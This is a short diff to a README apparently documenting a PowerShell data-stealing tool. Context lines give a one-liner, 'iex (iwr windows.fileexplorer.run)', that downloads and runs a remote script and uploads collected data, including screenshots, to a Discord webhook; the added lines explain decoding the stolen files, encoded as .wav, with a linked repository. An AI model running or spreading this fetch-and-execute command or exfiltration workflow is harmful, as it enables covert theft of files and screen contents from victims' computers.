@@ -54,6 +54,9 @@ iex (iwr windows.fileexplorer.run)
 
 This command downloads and executes the script, uploading all collected data to the specified Discord webhook.
 
+- Once the files are on your discord webhook, you can decode the .wav data using the code here:
+https://github.com/pentestfunctions/powershell-document-to-wav
+
 ## :warning: Features
 
 - **TakeScreenshot**: Captures the current screen.
